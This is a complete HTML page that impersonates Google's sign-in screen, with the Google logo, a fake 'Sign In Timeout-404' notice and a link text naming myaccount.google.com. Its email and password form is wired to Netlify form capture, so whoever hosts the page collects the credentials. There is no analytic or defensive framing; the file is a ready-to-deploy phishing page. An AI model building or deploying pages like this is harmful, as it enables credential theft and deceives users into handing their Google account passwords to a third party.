<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google V.2 Sign in</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" integrity="sha512-RXf+QSDCUQsZtr+sw9YH7w/k1+uEpSJ5N2ri90XQ6dVZ6OPwK9C7z6Ol1PzZ6goE/F6TQegCk3B+yG+jx6GFOw==" crossorigin="anonymous" referrerpolicy="no-referrer" />
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f2f2f2;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-container {
            background-color: #fff;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            width: 300px;
            text-align: center;
        }
        .login-container h2 {
            margin-bottom: 20px;
        }
        .login-container input[type="email"],
        .login-container input[type="password"] {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 5px;
        }
        .login-container button {
            width: 100%;
            padding: 10px;
            border: none;
            border-radius: 5px;
            background-color: #1e5d92;
            color: #fff;
            font-size: 16px;
            cursor: pointer;
        }
        .login-container button:hover {
            background-color: #0e4371;
        }
        .login-container .logo {
            margin-bottom: 20px;
        }
        .password-container {
            position: relative;
        }
        .password-container input[type="password"] {
            padding-right: 40px;
        }
        .password-container .toggle-password {
            position: absolute;
            right: 10px;
            top: 50%;
            transform: translateY(-50%);
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <h3>Google Sign In Timeout-404</h3>
        <hr>
        <div class="logo">
            <img src="https://i.postimg.cc/QMvB0mPs/Google-Logo.png" alt="Logo" width="100">
        </div>
        <h2>Sign in</h2>
        <p>to continue to <a href="#">myaccount.google.com</a></p>
        <form name="contact" netlify>
            <p>
                <label><input type="email" name="email" placeholder="Email"/></label>
            </p>
            <p class="password-container">
                <label><input type="password" name="password" id="password" placeholder="Password"/></label>
                <i class="fas fa-eye toggle-password" id="togglePassword"></i>
            </p>
            <p>
                <button type="submit">Next</button>
            </p>
        </form>
    </div>
    <script>
        const togglePassword = document.querySelector('#togglePassword');
        const password = document.querySelector('#password');
        
        togglePassword.addEventListener('click', function () {
            const type = password.getAttribute('type') === 'password' ? 'text' : 'password';
            password.setAttribute('type', type);
            this.classList.toggle('fa-eye-slash');
        });
    </script>
</body>
</html>
